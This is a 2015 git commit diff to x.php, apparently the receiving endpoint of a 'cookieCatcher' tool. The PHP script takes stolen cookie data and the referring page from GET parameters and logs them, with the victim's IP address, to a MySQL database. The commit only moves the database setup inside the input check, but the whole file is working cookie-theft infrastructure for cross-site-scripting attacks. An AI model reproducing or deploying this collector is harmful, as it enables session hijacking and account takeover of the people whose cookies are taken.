940458c1f87a24a76b985e25262eada45ec3c152
J2TeaM <juno_okyo@yahoo.com.vn>
2015-01-07 11:17:24 +0700

    Update x.php

--- x.php
+++ x.php
@@ -4,19 +4,19 @@ require_once('inc/mysql_querylab.php');
 require_once('inc/cookieCatcher.php');
 
 ////////////////////////////////////
-## Initiate Objects/Classes
-$catcher = new cookieCatcher();
-
-////////////////////////////////////
-## Initiate DB Connection
-$catcher->connect($db_HOST,$db_USERNAME,$db_PASSWORD,$db_NAME);
-
-////////////////////////////////////
 ## Grab cookie data and store in MySQL
 $cdata = $_GET['c'];
 $referer = $_GET['d'];
+
 // Check for valid cookie data
 if(isset($cdata) && $cdata != "" && isset($referer) && $referer!="") {
-  $catcher->grab($_SERVER['REMOTE_ADDR'],$referer,$cdata);
+	////////////////////////////////////
+	## Initiate Objects/Classes
+	$catcher = new cookieCatcher();
+
+	////////////////////////////////////
+	## Initiate DB Connection
+	$catcher->connect($db_HOST, $db_USERNAME, $db_PASSWORD, $db_NAME);
+	$catcher->grab($_SERVER['REMOTE_ADDR'], $referer, $cdata);
 }
 ?>
